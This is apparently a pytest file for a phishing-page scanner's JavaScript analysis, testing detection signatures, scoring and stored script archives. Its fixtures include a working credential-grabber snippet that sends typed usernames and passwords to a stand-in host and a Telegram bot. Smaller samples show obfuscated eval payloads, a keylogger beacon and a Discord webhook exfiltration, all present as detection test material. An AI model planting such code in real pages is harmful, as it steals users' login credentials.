"""Scripts of a scanned page: signatures, obfuscation, libraries, and the scan that uses them."""

from __future__ import annotations

import base64
import io

import pyzipper
from fastapi.testclient import TestClient

from app import jsanalysis, urlscan
from app.workers import previews
from tests.conftest import make_key
from tests.test_urls import PHISH, browser  # noqa: F401 - browser is a fixture

GRABBER = """
form.addEventListener('submit', function (e) {
  var u = document.querySelector('#i0116').value, p = document.querySelector('#passwd').value;
  fetch('https://cdn-update.top/gate.php', { method: 'POST', body: JSON.stringify({ u: u, p: p }) });
  fetch('https://api.telegram.org/bot7391:AAF/sendMessage?chat_id=1&text=' + encodeURIComponent(u + ':' + p));
});
"""
OBFUSCATED = "var _0x4f2a=['\\x68\\x65\\x6c\\x6c\\x6f'];" + "".join(
    f"function _0x{i:04x}(_0x1a2b,_0x3c4d){{return _0x4f2a[_0x1a2b-0x0]}}" for i in range(40)
)


def ids(code: str) -> set[str]:
    return {finding["id"] for finding in jsanalysis.findings(code)}


def test_signatures_match_what_they_name_and_nothing_else():
    assert ids(GRABBER) == {"exfil.telegram", "grabber.credentials"}
    found = jsanalysis.findings(GRABBER)
    assert found[0]["severity"] == "high" and found[0]["line"] == 5 and "api.telegram.org/bot" in found[0]["excerpt"]
    assert GRABBER[found[0]["start"] : found[0]["end"]].startswith("api.telegram.org/bot7391")

    # A key listener alone is a shortcut handler; with something sent out it is a keylogger.
    listener = "document.addEventListener('keydown', function (e) { if (e.key === 'Escape') close() })"
    assert ids(listener) == set()
    assert "keylogger" in ids(listener + "; new Image().src = 'https://x.example/k?' + keys")
    # Reading a password field without sending anything is a form validation.
    assert ids("if (document.getElementById('password').value.length < 8) warn()") == set()

    assert ids("eval(atob('YWxlcnQoMSk='))") == {"obf.eval-decode"}
    assert ids("eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'a|b'.split('|'),0,{}))") == {"obf.packer"}
    assert ids("document.write(unescape('%3Cscript%3E'))") == {"obf.document-write"}
    assert ids("window.location.replace(atob(t))") == {"redirect.encoded"}
    assert ids("setInterval(function(){debugger}, 100)") == {"anti-debug"}
    assert ids("var m = new CoinHive.Anonymous('k'); m.start()") == {"miner"}
    assert ids("fetch('https://discord.com/api/webhooks/1/abc', {method:'POST'})") == {"exfil.discord"}
    assert ids("if (navigator.webdriver) location = 'about:blank'") == {"evasion.automation"}
    assert ids("console.log('hello'); var total = a + b;") == set()


def test_a_script_is_measured_named_and_searched_for_indicators():
    meta = jsanalysis.analyse(
        GRABBER, kind="external", url="https://evil.example/a.js", host="evil.example", page_host="evil.example"
    )
    assert meta["severity"] == "high" and meta["thirdParty"] is False and meta["size"] == len(GRABBER.encode())
    assert len(meta["sha256"]) == 64 and 3 < meta["entropy"] < 6 and meta["library"] is None
    assert {"type": "url", "value": "https://cdn-update.top/gate.php"} in meta["iocs"]
    assert {"type": "domain", "value": "api.telegram.org"} in meta["iocs"]

    heavy = jsanalysis.analyse(OBFUSCATED, kind="inline")
    assert heavy["obfuscation"] >= 25 and "obf.string-array" in {f["id"] for f in heavy["findings"]}

    jquery = "/*! jQuery v3.7.1 | (c) OpenJS Foundation */ !function(e,t){}(window);"
    known = jsanalysis.analyse(
        jquery,
        kind="external",
        url="https://cdnjs.cloudflare.com/jquery.min.js",
        host="cdnjs.cloudflare.com",
        page_host="evil.example",
    )
    assert known["library"] == "jQuery 3.7.1" and known["thirdParty"] is True and known["findings"] == []
    assert jsanalysis.library("x", "www.googletagmanager.com") == "Google Tag Manager"


def test_scripts_add_to_the_scan_score_once_per_signature():
    scripts = [
        jsanalysis.analyse(GRABBER, kind="external", url="https://evil.example/app.min.js"),
        jsanalysis.analyse(GRABBER, kind="inline"),
    ]
    added = jsanalysis.score_findings(scripts)
    assert {f["id"] for f in added} == {"script:exfil.telegram", "script:grabber.credentials"}
    telegram = next(f for f in added if f["id"] == "script:exfil.telegram")
    assert telegram["points"] == 30 and telegram["text"] == "script app.min.js and 1 more: data sent to a Telegram bot"
    verdict = urlscan.with_scripts({"findings": [{"id": "x", "points": 20, "severity": "high", "text": "t"}]}, scripts)
    assert verdict["score"] == 75 and verdict["verdict"] == "phishing"
    assert urlscan.with_scripts({"findings": []}, [])["verdict"] == "clean"


def test_the_scan_keeps_the_scripts_and_their_indicators(admin: TestClient, browser, monkeypatch):  # noqa: F811
    key = make_key(admin)
    admin.post("/api/incidents", headers=key, json={"id": "u1", "name": "u1", "data": {}})
    act = previews.act
    worker = previews._browser
    script = {
        "id": 9,
        "method": "GET",
        "url": "https://login-paypa1.top/assets/app.min.js?v=2",
        "resourceType": "script",
        "navigation": False,
        "frame": "main",
        "state": "done",
        "response": {
            "status": 200,
            "mimeType": "application/javascript",
            "body": base64.b64encode(GRABBER.encode()).decode(),
        },
    }

    def with_inline(owner, session_id, action):
        state = act(owner, session_id, action)
        state["page"]["inlineScripts"] = [
            {"type": "", "text": "eval(atob('YWxlcnQoMSk='))"},
            {"type": "application/ld+json", "text": '{"@type": "Organization"}'},
        ]
        return state

    def with_script(method, path, body=None):
        answer = worker(method, path, body)
        if "entries" in answer:
            answer = {**answer, "entries": [*answer["entries"], script]}
        return answer

    monkeypatch.setattr(previews, "act", with_inline)
    monkeypatch.setattr(previews, "_browser", with_script)

    scan = admin.post("/api/artifacts/urls", headers=key, json={"url": "https://bit.ly/3xQ9a", "incident": "u1"}).json()
    done = admin.get(f"/api/urls/{scan['id']}", headers=key).json()
    scripts = done["result"]["scripts"]
    assert [s["kind"] for s in scripts] == ["external", "inline"]  # the JSON-LD block is not a script
    assert scripts[0]["url"].endswith("/assets/app.min.js?v=2") and scripts[0]["severity"] == "high"
    assert scripts[1]["name"] == "inline #1" and scripts[1]["findings"][0]["id"] == "obf.eval-decode"
    assert "code" not in scripts[0]
    assert {"script:exfil.telegram", "script:grabber.credentials", "script:obf.eval-decode"} <= {
        f["id"] for f in done["result"]["findings"]
    }
    assert done["score"] == 100

    one = admin.get(f"/api/urls/{scan['id']}/scripts/0", headers=key).json()
    assert one["code"] == GRABBER and one["index"] == 0 and one["findings"][0]["id"] == "exfil.telegram"
    assert admin.get(f"/api/urls/{scan['id']}/scripts/7", headers=key).status_code == 404
    packed = admin.get(f"/api/urls/{scan['id']}/scripts/0/download", headers=key)
    assert packed.headers["content-disposition"].startswith('attachment; filename="app.min.js.zip"')
    archive = pyzipper.AESZipFile(io.BytesIO(packed.content))
    archive.setpassword(b"infected")
    assert archive.read("app.min.js").decode() == GRABBER

    # What the scripts talk to is among the incident's indicators.
    values = {i["value"] for i in admin.get("/api/incidents/u1/iocs", headers=key).json()["iocs"]}
    assert {"https://cdn-update.top/gate.php", "cdn-update.top", "api.telegram.org"} <= values
    assert PHISH in values

    assert urlscan.scripts_path(scan["id"]).is_file()
    assert admin.delete(f"/api/artifacts/url-{scan['id']}", headers=key).status_code == 204
    assert not urlscan.scripts_path(scan["id"]).exists()
